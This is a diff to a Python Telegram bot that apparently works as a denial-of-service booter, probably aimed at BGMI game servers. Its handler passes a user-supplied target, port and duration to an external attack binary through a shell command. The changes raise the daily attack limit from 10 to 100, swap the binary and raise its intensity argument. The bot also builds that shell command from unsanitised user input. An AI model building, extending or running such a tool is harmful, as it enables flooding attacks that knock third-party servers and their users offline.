@@ -14,7 +14,7 @@ GROUP_ID = '-1002220511003'  # Allowed group ID
 approved_private_users = set()
 
 # Max daily attacks per person
-max_daily_attacks = 10
+max_daily_attacks = 100
 user_attack_count = {}
 running_attacks = {}
 user_last_attack_time = {}
@@ -63,7 +63,7 @@ def request_access(call):
     user_id = call.data.split('_')[1]
     user = bot.get_chat(user_id)
     username = user.username if user.username else "No username"
-    bot.send_message(admin_id, f"✅ 𝗡𝗘𝗪 𝗥𝗘𝗤𝗨𝗘𝗦𝗧\n\n🆔 - `{user_id}` 𝕠𝐫👤 @({username}) \n𝗥𝗲𝗾𝘂𝗲𝘀𝘁𝗲𝗱 𝗳𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲\n✓ `/approve_in_private {user_id}` to approve.")
+    bot.send_message(admin_id, f"✅ 𝗡𝗘𝗪 𝗥𝗘𝗤𝗨𝗘𝗦𝗧\n\n🆔 - `{user_id}` 𝕠𝐫👤 @{username} \n𝗥𝗲𝗾𝘂𝗲𝘀𝘁𝗲𝗱 𝗳𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲\n✓ `/approve_in_private {user_id}` to approve.")
     bot.send_message(user_id, "𝗥𝗘𝗤𝗨𝗘𝗦𝗧 𝗦𝗘𝗡𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬✅\n𝗣𝗟𝗘𝗔𝗦𝗘 𝗪𝗔𝗜𝗧 𝗙𝗢𝗥 𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟")
 
 # Command: Approve user for private chat
@@ -146,7 +146,7 @@ def handle_bgmi(message):
     user_last_attack_time[user_id] = current_time
     user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1
 
-    full_command = f"./S42 {target} {port} {attack_time} 100"
+    full_command = f"./S44 {target} {port} {attack_time} 930"
     process = subprocess.Popen(full_command, shell=True)
     running_attacks[user_id] = process
 
